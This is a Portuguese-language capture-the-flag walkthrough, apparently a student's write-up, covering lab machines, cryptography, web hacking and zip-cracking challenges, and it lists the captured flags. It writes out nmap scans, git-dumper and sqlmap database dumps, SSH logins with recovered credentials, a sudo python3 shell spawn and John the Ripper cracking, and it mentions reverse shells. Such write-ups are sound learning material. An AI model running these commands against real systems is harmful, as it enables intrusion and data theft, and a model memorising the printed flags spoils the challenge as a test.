# CTF Wargaming

* <a href="#Capture The Flag">Capture The Flag</a>;
  * <a href="#Capture The Flag 01 - User">Capture The Flag 01 - User</a>;
  * <a href="#Capture The Flag 01 - Root">Capture The Flag 01 - Root</a>;
  * <a href="#Capture The Flag 03 - User">Capture The Flag 03 - User</a>;
  * <a href="#Capture The Flag 03 - Root">Capture The Flag 03 - Root</a>;
* <a href="#Cryptography">Cryptography</a>;
  * <a href="#Cryptography 01">Cryptography 01</a>
  * <a href="#Cryptography 03">Cryptography 03</a>;
* <a href="#Web Hacking">Web Hacking</a>;
  *  <a href="#Web Hacking 01">Web Hacking 01</a>;
  * <a href="#Web Hacking 02">Web Hacking 02</a>;
* <a href="#Bonus">Bonus</a>;
  * <a href="#Bonus 1">Bonus 1</a>;
  * <a href="#Bonus 2">Bonus 2</a>;
* <a href="#Conclusão">Conclusão</a>;

 # Capture The Flag 

 ## Capture The Flag 01 - User
 
Primeiro passo para capturar flag, fizemos o escanner do ip para ver quais são as portas abertas com o `NMAP` e serviços em execução. Usudando o seguinte comando.
  ```shell
 nmap -sC 192.168.10.31 -p- -sV  
  ```
  Quando o scanner terminou vimos que a porta 80 que é a porta padrão de *HTTP* e 22 que é a porta padrão de *SSH* estvâo abertas.
  Em seguida explaramos a directorias `/myfiles` e atravéz desse encontramos a directoria `/secret`. Dentro dessa directoria identificamos o arquivo `.mysecret.txt` que continha chave privada codificada em base58.
  ```shell
 http://192.168.10.31/~secret/.mysecret.txt
  ```
![image](https://github.com/Dianilze/Dianilze/assets/133764203/1cb2b130-aee0-44a7-bef2-9ed4dd48349a)

Decodificamos essa chave privada.

Com ajuda de Jhon the Ripper encontramos uma senha e conseguimos autenticar com *SSH*.
  ```shell
  ssh -i sshkey icex64@192.168.10.31

 icex64@LupinOne:˜$ cat user.txt
  ```

* `Flag` - w4r64m1n62023{jTVFcBk1thgOVsOGRBjKzbTzYuHL8p3L}

## Capture The Flag 01 - Root 

Listramos os privilégios do usuário

 ```shell
  sudo -l
 ```
Identificamos que o podemos executar `/usr/bin/python3.9 /home/arsene/heist.py` sem password.
Analisamos o contéudo do arquivo `/usr/lib/python3.9/webbrowser.py` e injetamos um comando para obter uma shell reversa:

 ```shell
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
Não consegui achar o flag.

## Capture The Flag 03 - User

Fizemos scanner dá maquina com o `NMAP` para ver a portas abertas e serviços em execução

```shell
nmap -sC 192.168.10.33 -p- -sV
```
Descobrimos que um repositório `Git` e localizamos o aquivo `login.php`.

![image](https://github.com/Dianilze/Dianilze/assets/133764203/4d901b52-cf9b-4762-933b-a5d2d2ba2136)


Utilizamos a ferramenta gitdumper para compreensão do conjunto de dados.

```shell
cd git-dumper
sudo mkdir gitlogs
python3 git_dumper.py http://192.168.10.32/.git/ gitlogs
cd gitlogs
git log
```
Nos log do Git identificamos entrada que indica a adição do arquivo `login.php` com credenciais padrão `lush@admin.com e 321`.

No site usamos essas creddenciais para autenticação. E com ajuda de Burp Suite capturamos cookies da página para realizar uma injeção SQL.

E dentro de um novo arquivo `sql` inserimos os cookies colectados com o Burp Suite.

Usamos o sqlmap para explorar o banco de dados, descobrindo 5 bancos de dados. Em seguida, realizamos a injeçãoo SQL para extrair dados do banco chamado `darkhole_2`.

```shell
sqlmap -r sql --dbs --batch

sql -r sql -D darkhole_2 --dump-all --batc
```
Dentro do banco de dados, encontramos uma tabela SSH com um usuário `jehad` e senha `fool`.
Com o serviço SSH autenticamos com essas cradenciais

```shell
ssh jehad@192.168.10.33
```

Exploramos o sistema de arquivo e identificamos o usuário `losy`, accessamos seu directoria e vimos o arquivo `user.txt`.

```shell
cd /home/losy
ls -l
cat user.txt
```

* `Flag` - w4r64m1n62023{iHt4nDFxu7208UxRabLPLHuNSJMup3sf}

## Capture The Flag 03 - Root

Realizamos uma análise do arquivo `/etc/crontabe` identificamos a execuçãoo de um servidor PHP em `/opt/web` na porta 9999. Analisamos o código-fonte em `/opt/web/index.php`, notamos a presença de
um comando GET chamado `cmd`.

Para explorar isso, estabelecemos um túnel SSH para a porta 9999 e, ao acessarmos  localhost:9999, identificamos que poderíamos enviar comandos através da URL com o parâmetro `?cmd`.

Ao escutar na porta 9001, executamos um comando Bash para obter uma shell reversa. O históricode comandos revelou um usuário chamado `losy` e sua capacidade de executar `/usr/bin/python3` como
root.

```shell
sudo python3 -c ’import pty; pty.spawn("/bin/bash")
```

Na directoria `/root`, encontramos o aquivo `root.txt`.

```shell
cat root.txt
```

* `Flag` - : w4r64m1n62023{kFgI9OPREW96ShkyV343sSvwZj9lXlEa}
  

# Cryptography

## Cryptography 01

Utilizamos o descodificador `ROT-47` disponivel em `dcode.fr`.

O ROT-47 é uma cifra de subtituição para rota os caracteres ASCII.

* `Flag` - w4r64m1n62023{we6f4ka1yfmnequ0t6zeo9ebfox02xcici9d2c00ml48yfmo142bamyzaupdilpy}
  
![image](https://github.com/Dianilze/Dianilze/assets/133764203/61c8c0fe-2345-4537-8173-cc53b4f4954a)


## Cryptography 03

Para decodificar a terceira flag, utilizamos um script Python. Este script foi desenvolvido para inverter astring codificada, revelando a mensagem original.

O processo de decodificação resultou na seguinte flag:

* `Flag` - w4r64m1n62023{r3v3r53_3n61n33r_7h15_m07h3r_7ruck3r}

# Web Hacking

## Web Hacking 01 
 
Ao inspecionar o código da pagina da web, podemos ver que as credenciais estão codificadas usando a função String.fromCharCode(119,52,114,54,52,...).


![image](https://github.com/Dianilze/Dianilze/assets/133764203/6261e5d5-fea4-44ba-8591-423aaa769295)


Descodeficamos para texto ASCII.

* `Flag` - w4r64m1n62023{j4v45cr1p7155up3r53cur3m4n}

## Web Hacking 02 

Ao deparar-nos com uma página de login, tentamos as credenciais padrão (admin/admin) sem sucesso.

Em seguida, realizamos uma injeção SQL inserindo um usuário admin.

Utilizamos a ferramenta de busca de exploits, searchsploit, para encontrar um script em Python que aproveita uma vulnerabilidade de injeção SQL na versão do Drupal em execução. 

Executamos o script para explorar a aplicação e, no conteúdo da resposta, encontramos a flag:

* `Flag` - w4r64m1n62023{drup4l_h45_n3v3r_b33n_vuln3r4bl3_1_4m_5ur3_0f_7h47}

# Bonus 

## Bonus 1 

Extraímos o hash do arquivo zip

```shell
sudo john flags.zip

zip2john flags.zip > flags.txt
```
Quebramos o hash Usando o John the Ripper  no formato PKZIP

```shell
john flag.zip.hash --format=PKZIP
```
Usamos a senha ”juelma” para quebrar o hash. Descomprimimos o arquivo ”flag.zip”

```shell
unzip flag.zip
```
Repetimos o processo para um diretório de flags

```shell
zip2john flags/* > flags.hash

john flags.hash

john flags.hash --format=PKZIP -w

/usr/share/wordlists/seclists/Passwords/LeakedDatabases/rockyou.txt
````

Descomprimimos as flags:

```shell
unzip flags
```

Isso levou `a descoberta da flag 15 com a senha ”Maybe the flag was something to do with the zip
passwords?

```shell
w-atje
4-14-88
rocku
62679584
400019
misty
140426
noah2000
606060
220485
096100268
200278
345smak
{Prine
bogartc
0-0-patrick
n$ar8376
u)Pcxmqn
5*1790*
pinkbum6
0,CENTER
1!qwert
ncstate100
7 mile
5’CALIBER
milagros
annalise
NOLOSE
}030894
```

Analisamos  as senhas e vimmos que os primeiros caracteres de cada uma para formar a flag

* `Flag` - w4r64m1n62023{b0nu5p01n75maN}

## Bonus 2

Abrimos o arquivo `flag.exe` e constatamos que o arquivo é um arquivo de texto codificado em hexadecimal.
Decodificamos e obtemomos um codigo `Brainfuck`, executamos o codego e o flag é a saida.

* `Flag` - w4r64m1n62023{7h3_br41n_funk_15_h4rd_br0}
  
## Conclusão
A conclusão deste walkthrough ressalta a importância e a riqueza da experiência adquirida ao enfrentar desafios em áreas como Criptografia, Webhacking, Análise Forense e Sistemas Linux. Participar de um ambiente de Capture The Flag (CTF) proporcionou uma oportunidade prática e desafiadora para aprimorar as habilidades de segurança cibernética.

Embora alguns desafios não tenham sido concluídos com êxito devido à sua complexidade, essa natureza desafiadora incentivou a pesquisa e o aprendizado contínuo, estimulando a busca por soluções inovadoras e o desenvolvimento de estratégias eficazes.

A colaboração em grupo revelou-se crucial, permitindo a troca de conhecimentos e a aplicação de abordagens diversas na resolução dos desafios. A exploração de ferramentas e técnicas não familiares expandiu o conjunto de habilidades e proporcionou uma visão mais ampla do cenário de segurança.
Este walkthrough não apenas permitiu a aplicação prática de conceitos teóricos, mas também enfatizou a importância da adaptabilidade e do raciocínio crítico ao enfrentar cenários de segurança cibernética do mundo real. As habilidades adquiridas durante este processo são inestimáveis e contribuem significativamente para o aprimoramento profissional na área

- 👋 Hi, I’m @Dianilze Nº 46246

